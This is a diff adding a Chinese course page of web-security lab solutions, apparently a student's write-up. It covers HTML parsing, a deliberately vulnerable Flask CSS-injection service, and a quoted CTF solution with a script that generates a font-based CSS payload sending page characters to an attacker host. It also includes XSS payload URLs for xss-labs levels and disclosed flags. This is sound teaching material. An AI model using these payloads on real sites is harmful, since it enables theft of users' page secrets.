@@ -1,0 +1,324 @@
+---
+title: Web Lab 2：用户侧攻击
+---
+
+
+import Asciinema from '@/components/md-comp/AsciinemaWrapper.vue'
+import Card from '@/components/md-comp/card.vue'
+
+{/* IRON:04en7l2cbiwppgncop5lzf1yco5dqeci:OB */}
+
+import PasswordContainer from '@md-components/passwordContainer.vue';
+
+<PasswordContainer md5="d891d2993a719c08ec7515ab8ae4a264">
+
+# Task 1: HTML Parser (15 分)
+
+
+<Card title="任务" type="task">
+
+这里有一个含有大量节点的 HTML 文档,请把它解析为一个树状结构并按照**层序遍历**的方式输出每个节点的类型及 `id` ,得到一行很长的字符串`s`.其中每个节点的类型和 `id` 之间用`:`连接(如果没有 `id` 则以 `:` 作为这个节点的结尾),不同节点之间用`,`分隔
+
+样例输入:
+
+```html
+<html>
+<head>
+    <title>Test</title>
+</head>
+<body>
+    <div id="main">
+        <h1 name="welcome">Welcome</h1>
+        <p>This is a test.</p>
+        <ul>
+            <li id="item1">Item 1</li>
+            <li id="item2">Item 2</li>
+        </ul>
+    </div>
+</html>
+```
+
+预期输出(`s`):
+
+```
+html:,head:,body:,title:,div:main,h1:,p:,ul:,li:item1,li:item2
+```
+
+然后计算`s`的 `MD5` 值,在外面加上`AAA{}` 的格式提交,题目平台的`flag`按照以下代码生成:
+
+```python
+import hashlib
+s = "......"
+md5_hash = hashlib.md5(s.encode()).hexdigest()
+print("AAA{" + md5_hash + "}")
+```
+
+</Card>
+
+
+调包侠，启动！
+
+```js
+const { JSDOM } = require('jsdom');
+
+function parseHTML(html) {
+    const dom = new JSDOM(html);
+    const document = dom.window.document;
+    const result = [];
+    const queue = [document.documentElement]; // 从根节点<html>开始
+
+    while (queue.length > 0) {
+        const node = queue.shift();
+        
+        // 只处理元素节点 (nodeType 1)
+        if (node.nodeType === 1) {
+            const tag = node.tagName.toLowerCase();
+            const id = node.id || '';
+            result.push(`${tag}:${id}`);
+            
+            // 将当前节点的所有元素子节点加入队列
+            for (let child of node.children) {
+                queue.push(child);
+            }
+        }
+    }
+
+    return result.join(',');
+}
+
+const fs = require('fs');
+const f = fs.readFileSync('html_parser.html', 'utf8');
+
+const result = parseHTML(f);
+console.log(result);
+```
+
+# Task 2: Show me the secret (20 分)
+
+<Card title="任务" type="task">
+
+回顾课程第 16 页 slides 的情景,自行搭建一个服务,编写完整脚本泄露受害者页面的 flag
+
+如果你不知道从哪里开始,你可以解释下面这个情景并在此基础上编写获取 flag 的脚本
+
+```python
+from flask import Flask, render_template, request, redirect, url_for
+import os
+
+app = Flask(__name__)
+
+SECRET_VALUE = "AAA{Well_done!Here_is_20_points_for_you!D81B3EB8-ABA4}"
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+@app.route('/victim')
+def victim():
+    if request.remote_addr != "127.0.0.1":
+        return "You are not victim, only the victim can access this page.", 403
+    return render_template('victim.html', secret=SECRET_VALUE)
+
+@app.route('/inject', methods=['GET', 'POST'])
+def inject_css():
+    if request.method == 'POST':
+        css_content = request.form.get('css', '')
+        with open('static/custom.css', 'w') as f:
+            f.write(css_content)
+        return redirect(url_for('inject_css'))
+
+    css_content = ""
+    if os.path.exists('static/custom.css'):
+        with open('static/custom.css', 'r') as f:
+            css_content = f.read()
+
+    return render_template('inject.html', css=css_content)
+
+if __name__ == '__main__':
+    if not os.path.exists('static'):
+        os.makedirs('static')
+    if not os.path.exists('static/custom.css'):
+        with open('static/custom.css', 'w') as f:
+            f.write('/* css injection */')
+    
+    app.run(host='0.0.0.0', port=5000)
+```
+
+```html
+<!-- victim.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Victim</title>
+    <link rel="stylesheet" href="/static/custom.css">
+</head>
+<body>
+    <div>
+        <p>Welcome, Victim!</p>
+        <p>Your page is safe, no one will see the secret info.</p>
+    </div>
+    
+    <div>
+        <input type="hidden" name="secret" value="{{ secret }}">
+    </div>
+</body>
+</html>
+```
+
+```html
+<!-- inject.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <div>
+        The current css of the victim's page is:
+        <pre>{{ css }}</pre>
+    </div>
+    <div>
+        <form action="/inject" method="post">
+            <label for="css">Inject CSS:</label>
+            <br>
+            <textarea id="css" name="css" rows="10" cols="30"></textarea>
+            <br>
+            <button type="submit">Inject</button>
+        </form>
+    </div>
+</body>
+</html>
+```
+
+
+</Card>
+
+~~环境有点逆天了~~
+
+# Task 3: node._sanitized (30 分)
+
+<Card title="任务" type="task">
+结合课上讲的 DOM Clobbering  知识,搜索并简要解释 CVE-2017-0928 的原理
+</Card>
+
+
+# Task 4: Gradient (30 分)
+
+<Card title="任务" type="task">
+
+在 Task2 的基础上,你仍然可以控制受害者页面的 CSS,但如果受害者页面的 flag 不以
+
+```html
+<input type="hidden" name="secret" value="AAA{secret}">
+```
+
+的简单形式出现,而是以以下形式出现:
+
+```html
+<div id="secret">
+    <span>A</span>
+    <span>A</span>
+    <span>A</span>
+    <span>{</span>
+    <span>W</span>
+    <span>e</span>
+    <span>l</span>
+    <span>l</span>
+    <span>_</span>
+    <span>d</span>
+    <span>o</span>
+    <span>n</span>
+    <span>e</span>
+    ......
+    <span>!</span>
+    <span>}</span>
+</div>
+```
+
+你该如何编写脚本获取 flag?
+
+</Card>
+
+We are referring to our own Writeup:
+
+https://blog.5dbwat4.top/arch/SJTUCTF2025-Writeup-2#Gradient
+
+
+> 
+> > 快来挑选你喜欢的渐变色吧！
+> 
+> 原题，秒了：[[Web Exploitation] Exfiltration via CSS Injection | tripoloski blog](https://tripoloski1337.github.io/webex/2024/07/24/exfil-using-only-css.html)
+> 
+> 你怎么知道我赛前刚读过这篇文章。
+> 
+> ```js
+> const host="http://*.*.*.*:*";
+> const fs=require("fs")
+> 
+> let cs = " red,red);}"
+> for(let i=0;i<50;i++){
+> for(let j=0;j<256;j++){
+>   cs +=  `@font-face {font-family: aaaaaaaaaa-${i};`+
+>          `src:url("${host}/leak+${i}+${j}");`+
+>          `unicode-range:U+${j.toString(16)};}`
+> }
+> cs+= `span:nth-child(${i}){font-family:aaaaaaaaaa-${i}}`
+> }
+> 
+> cs+="*{width:calc(1"
+> fs.writeFileSync("payload",cs)
+> ```
+> 
+> 结果：`48 111 112 115 123 85 53 101 95 36 116 116 70 125`
+> 
+> `0ops{U5e_$ttF}`
+> 
+> 
+
+
+# Task 5 & 6: XSS 1 & 2 (60 分)
+
+<Card title="任务" type="task">
+
+通过[xss-labs](http://test.ctf8.com)前十关,每关六分.源码可在 https://github.com/do0dl3/xss-labs 找到
+
+</Card>
+
+1. `http://test.ctf8.com/level1.php?name=<script>alert(1)</script>`
+
+    没有做任何防御
+    ```php
+    <?php 
+    ini_set("display_errors", 0);
+    $str = $_GET["name"];
+    echo "<h2 align=center>欢迎用户".$str."</h2>";
+    ?>
+    ```
+    
+
+2. `http://test.ctf8.com/level2.php?keyword="><script>alert(11)</script>`
+
+    关键注入点在这里
+    ```php
+    '<input name=keyword  value="'.$str.'">'
+    ```
+    
+
+3. 
+
+# Task 7: 拓展 (20 分)
+
+<Card title="任务" type="task">
+
+简要回答下面两个问题,言之有理即可:
+
+- 自行搜索并学习**中间人攻击**,解释为什么我们要避免连接公共Wifi (如饭馆,咖啡厅)
+
+- 自行搜索并学习课上提到的**CSP 策略**,解释为什么 CSP 可以防止 XSS 攻击,并构造一个配置不当的 CSP 被绕过的例子(不需要给出代码实现,只需要描述)
+
+</Card> 
+
+</PasswordContainer>
